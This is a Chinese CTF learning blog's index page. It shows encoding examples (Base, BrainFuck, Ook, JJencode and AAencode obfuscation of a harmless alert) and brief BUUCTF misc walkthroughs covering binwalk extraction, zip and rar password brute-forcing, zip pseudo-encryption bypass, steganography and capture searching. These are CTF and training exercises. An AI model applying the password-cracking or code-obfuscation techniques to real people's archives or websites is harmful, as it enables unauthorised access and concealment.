<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">184</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/15/crypto-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/">crypto-古典密码</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-15</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/14/crypto/">crypto-编码</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-14</time><div class="content"><h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><h2 id="ascii码"><a href="#ascii码" class="headerlink" title="ascii码"></a>ascii码</h2><h2 id="hex编码"><a href="#hex编码" class="headerlink" title="hex编码"></a>hex编码</h2><p>信息转为十六进制</p>
<h2 id="base家族"><a href="#base家族" class="headerlink" title="base家族"></a>base家族</h2><p>ase64 用于编码邮件内容、网页图片，意在减少传输过程中可能出现的错误；Base58 是比特币地址使用的编码方法，旨在提高地址的辨识度；Base32 用在一些对大小写不敏感的文件系统中。每种 Base-x 的编码都有适合它们的应用场景。</p>
<p>Base编码从底层来说就是对数据进行进制转换，Base64是64进制，Base32是32进制，Base16是16进制。而中间的过程是为了更好地进行传输数据</p>
<h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><h2 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h2><h2 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h2><h2 id="Morse电码"><a href="#Morse电码" class="headerlink" title="Morse电码"></a>Morse电码</h2><h2 id="JSFuck"><a href="#JSFuck" class="headerlink" title="JSFuck"></a>JSFuck</h2><p>只需要“()+[]!”这6个字符组成的字符串。jsfuck的编码和解码与morsecode类似，只不过其表示的是<code>JavaScript</code>的语句。jsfuck源于一门编程语言brainfuck，其主要的思想就是只使用8种特定的符号来编写代码。jsfuck也是沿用了这个思想，它仅仅使用6种符号来编写代码。它们分别是<code>()+[]!</code></p>
<p>JSFuck可以使用jsfuck官方的网站进行解密：<a target="_blank" rel="noopener" href="http://www.jsfuck.com/">JSFuck - Write any JavaScript with 6 Characters: !+</a></p>
<h2 id="Quoted-Printable编码"><a href="#Quoted-Printable编码" class="headerlink" title="Quoted-Printable编码"></a>Quoted-Printable编码</h2><p>比如：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">密码学</span><br></pre></td></tr></table></figure>

<p>可以使用Quoted-printable编码为：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">=E5=AF=86=E7=A0=81=E5=AD=A6=0A=09=09=09=09=09</span><br></pre></td></tr></table></figure>

<p>Quoted-printable的编码形式也比较容易辨认，基本上就是字符加等于号构成编码文段格式。</p>
<h2 id="BrainFuck编码"><a href="#BrainFuck编码" class="headerlink" title="BrainFuck编码"></a>BrainFuck编码</h2><p>比如：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Hello world!</span><br></pre></td></tr></table></figure>

<p>使用BrainFuck进行编码就会得到</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +++++ .&lt;+++ ++[-&gt; +++++ &lt;]&gt;++ ++.++ +++++</span><br><span class="line"></span><br><span class="line">..+++ .&lt;+++ +++++ [-&gt;-- ----- -&lt;]&gt;- ----- ----- ----. &lt;++++ +++[- &gt;++++</span><br><span class="line"></span><br><span class="line">+++&lt;] &gt;++++ ++.&lt;+ +++[- &gt;++++ &lt;]&gt;++ +++++ +.+++ .---- --.-- ----- -.&lt;++</span><br><span class="line"></span><br><span class="line">+++++ +[-&gt;- ----- --&lt;]&gt; ---.&lt; </span><br></pre></td></tr></table></figure>

<p>可以使用<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">Brainfuck/Ook! Obfuscation/Encoding</a> 这个网站进行编码和解码</p>
<h2 id="Ook编码"><a href="#Ook编码" class="headerlink" title="Ook编码"></a>Ook编码</h2><p>Ook也是一种小型的编程语言，Ook是为红毛猩猩设计的编程语言，设计思路和BrainFuck的设计思路基本类似，但是Ook采用了更少的元素进行编程，语句更加简单。由于Ook的特点，因此Ook也可以设计为一种特殊的编码方式。</p>
<p>比如：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Hello world!</span><br></pre></td></tr></table></figure>

<p>使用Ook编码后，得到</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.</span><br><span class="line"></span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!</span><br><span class="line"></span><br><span class="line">Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!</span><br><span class="line"></span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook! Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line"></span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!</span><br><span class="line"></span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line"></span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook.</span><br><span class="line"></span><br><span class="line">Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook?</span><br><span class="line"></span><br><span class="line">Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line"></span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.</span><br><span class="line"></span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook!</span><br><span class="line"></span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line"></span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line"></span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line"></span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook?</span><br><span class="line"></span><br><span class="line">Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. </span><br></pre></td></tr></table></figure>

<p>非常长，进行Ook编码和解码的网站也是<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">Brainfuck/Ook! Obfuscation/Encoding</a></p>
<h2 id="UUencode编码"><a href="#UUencode编码" class="headerlink" title="UUencode编码"></a>UUencode编码</h2><p>比如</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Hello World!</span><br></pre></td></tr></table></figure>

<p>进行编码后得到：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">,2&amp;5L;&amp;\@5V]R;&amp;0A</span><br></pre></td></tr></table></figure>

<h2 id="XXencode编码"><a href="#XXencode编码" class="headerlink" title="XXencode编码"></a>XXencode编码</h2><p>比如：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Hello World!</span><br></pre></td></tr></table></figure>

<p>进行XXencode编码后，得到</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">BG4JgP4wUJqxmP4EV0U++</span><br></pre></td></tr></table></figure>

<h2 id="JJencode编码"><a href="#JJencode编码" class="headerlink" title="JJencode编码"></a>JJencode编码</h2><p>算是JSFuck编码的前身，是由18种字符组成的编码格式。是针对JavaScript进行设计的编码方式。</p>
<p>长谷川阳介（Yosuke Hasegawa）于2009年7月创建了一个名为“jjencode”的网络应用程序，可将一切的JavaScript代码混淆为!+,”$.:;_{}~=这十八个字符的排列组合。</p>
<p>比如：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">alert(&quot;Hello, JavaScript&quot; )</span><br></pre></td></tr></table></figure>

<p>进行jjencode编码，得到</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">$=~[];$=&#123;___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:(&#123;&#125;+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:(&#123;&#125;+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$&#125;;$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(\\\&quot;\\&quot;+$.__$+$.__$+$.___+$.$$$_+(![]+&quot;&quot;)[$._$_]+(![]+&quot;&quot;)[$._$_]+$._$+&quot;,\\&quot;+$.$__+$.___+&quot;\\&quot;+$.__$+$.__$+$._$_+$.$_$_+&quot;\\&quot;+$.__$+$.$$_+$.$$_+$.$_$_+&quot;\\&quot;+$.__$+$._$_+$._$$+$.$$__+&quot;\\&quot;+$.__$+$.$$_+$._$_+&quot;\\&quot;+$.__$+$.$_$+$.__$+&quot;\\&quot;+$.__$+$.$$_+$.___+$.__+&quot;\\\&quot;\\&quot;+$.$__+$.___+&quot;)&quot;+&quot;\&quot;&quot;)())();</span><br></pre></td></tr></table></figure>

<h2 id="AAencode编码"><a href="#AAencode编码" class="headerlink" title="AAencode编码"></a>AAencode编码</h2><p>aaencode编码是一个比较有意思的编码形式，同样也是对于JavaScript语言设计的编码方式，是把JavaScript的代码编码成日本的表情包。</p>
<p>比如：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">alert(&quot;Hello, JavaScript&quot;)</span><br></pre></td></tr></table></figure>

<p>通过aaencode编码，得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ﾟωﾟﾉ&#x3D; &#x2F;｀ｍ´）ﾉ ~┻━┻   &#x2F;&#x2F;*´∇｀*&#x2F; [&#39;_&#39;]; o&#x3D;(ﾟｰﾟ)  &#x3D;_&#x3D;3; c&#x3D;(ﾟΘﾟ) &#x3D;(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) &#x3D;(ﾟΘﾟ)&#x3D; (o^_^o)&#x2F; (o^_^o);(ﾟДﾟ)&#x3D;&#123;ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] &#x3D;((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)&#x3D;(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] &#x3D;(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)&#x3D;((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+&#x3D;(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]&#x3D;&#39;\\&#39;; (ﾟДﾟ).ﾟΘﾟﾉ&#x3D;(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)&#x3D;(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]&#x3D;&#39;\&quot;&#39;;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;);</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/14/misc%E7%BD%91%E7%AB%99/">misc网站</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-14</time><div class="content"><p>brainfuck加密:<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a><br>base64解码后可以直接转文件:<a target="_blank" rel="noopener" href="https://the-x.cn/base64">https://the-x.cn/base64</a><br>bugku解密网站:<a target="_blank" rel="noopener" href="https://ctf.bugku.com/tools.html">https://ctf.bugku.com/tools.html</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/13/NSSCTF-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">NSSCTF-phar反序列化</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-13</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/13/buu-missc/">buu-misc</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-13</time><div class="content"><p>忘记保存了，无语了，所以直接写一下解题思路</p>
<h2 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h2><p>选择analyze的frame browser</p>
<h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -e 1.png</span><br></pre></td></tr></table></figure>

<p>只用zip密码爆破软件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211013102808.png" alt="img" style="zoom:67%;"><br> <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211013103515.png" alt="img" style="zoom:67%;"></p>
<h2 id="N种方式解决"><a href="#N种方式解决" class="headerlink" title="N种方式解决"></a>N种方式解决</h2><p>在网页中打开（写个html代码）</p>
<h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>很显然啊 图片长宽不对<br>在010中打开 调整长高<br>18、19位是长，22、23是宽<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211013164208.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211013164404.png" alt="img" style="zoom:67%;"></p>
<h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p>010中打开 搜索flag 或拉到底</p>
<h2 id="基础破解-rar"><a href="#基础破解-rar" class="headerlink" title="基础破解 rar"></a>基础破解 rar</h2><p>使用rar破解工具</p>
<h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>看到RGB中的0通道上面有一行内容</p>
<p>先选择analyse -&gt;data extract-&gt;save bin保存为png 扫描一下<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211013172408.png" alt="img" style="zoom:67%;"><br> <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211013172421.png" alt="img" style="zoom:67%;"></p>
<h2 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h2><p>记事本打开（改后缀）</p>
<h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>就是这个zip</p>
<p>zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包</p>
<p>一个 ZIP 文件由<strong>三个部分</strong>组成：</p>
<p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</p>
<p><strong>压缩源文件数据区</strong>：</p>
<p>50 4B 03 04：这是头文件标记（0x04034b50）</p>
<p>14 00：解压文件所需 pkware 版本</p>
<p>00 00：全局方式位标记（有无加密）</p>
<p>08 00：压缩方式</p>
<p>5A 7E：最后修改文件时间</p>
<p>F7 46：最后修改文件日期</p>
<p>16 B5 80 14：CRC-32校验（1480B516）</p>
<p>19 00 00 00：压缩后尺寸（25）</p>
<p>17 00 00 00：未压缩尺寸（23）</p>
<p>07 00：文件名长度</p>
<p>00 00：扩展记录长度</p>
<p><strong>压缩源文件目录区</strong>：</p>
<p>50 4B 01 02：目录中文件文件头标记(0x02014b50)</p>
<p>3F 00：压缩使用的 pkware 版本</p>
<p>14 00：解压文件所需 pkware 版本</p>
<p>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</p>
<p>08 00：压缩方式</p>
<p>5A 7E：最后修改文件时间</p>
<p>F7 46：最后修改文件日期</p>
<p>16 B5 80 14：CRC-32校验（1480B516）</p>
<p>19 00 00 00：压缩后尺寸（25）</p>
<p>17 00 00 00：未压缩尺寸（23）</p>
<p>07 00：文件名长度</p>
<p>24 00：扩展字段长度</p>
<p>00 00：文件注释长度</p>
<p>00 00：磁盘开始号</p>
<p>00 00：内部文件属性</p>
<p>20 00 00 00：外部文件属性</p>
<p>00 00 00 00：局部头部偏移量</p>
<p><strong>压缩源文件目录结束标志</strong>：</p>
<p>50 4B 05 06：目录结束标记</p>
<p>00 00：当前磁盘编号</p>
<p>00 00：目录区开始磁盘编号</p>
<p>01 00：本磁盘上纪录总数</p>
<p>01 00：目录区中纪录总数</p>
<p>59 00 00 00：目录区尺寸大小</p>
<p>3E 00 00 00：目录区对第一张磁盘的偏移量</p>
<p>00 00：ZIP 文件注释长度</p>
<p>因此，根据此题目来看： </p>
<p>压缩源文件数据区：50 4B 03 04：这是头文件标记<br>然后我们直接搜索加密方式<br>0900 说明是有加密，0800说明无加密</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014141943.png" alt="img"></p>
<p>接下来使用其他解压软件打开就行了，这里用得是winrar</p>
<h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><p>直接搜索flag就行了</p>
<h2 id="镜子里的世界"><a href="#镜子里的世界" class="headerlink" title="镜子里的世界"></a>镜子里的世界</h2><p>使用stegslove 打开，点击extract preview功能，选取最低0通道，<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014143253.png" alt="img" style="zoom: 80%;"><br>打开即可看到flag</p>
<h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><p>在010editor中发现信息<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014143814.png" alt="img" style="zoom:67%;"></p>
<p>使用分离工具分离一下<br>然后zip密码爆破一下</p>
<h2 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014145956.png" alt="img" style="zoom:50%;">
应该又是要分离一下文件，分离 以后需要密码，再回去看 发现010editor有说
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014153055.png" alt="img" style="zoom:67%;">

<h2 id="escape-cap"><a href="#escape-cap" class="headerlink" title="escape cap"></a>escape cap</h2><p>追踪tcp流即可</p>
<h2 id="另一个世界"><a href="#另一个世界" class="headerlink" title="另一个世界"></a>另一个世界</h2><p>文件尾巴，然后二进制转字符串即可z</p>
<h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><p>图片隐写 使用010打开，直接点击搜索类型——text，然后点击搜索flag即可</p>
<h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>steg打开，使用bin保存，然后保存为zip，解压以后得到的文件，使用010打开，然后搜索{<br>就可以找到flag<br><strong>这里说一下思路</strong>感觉没有提示，单纯让你就是硬试？所以小结一下</p>
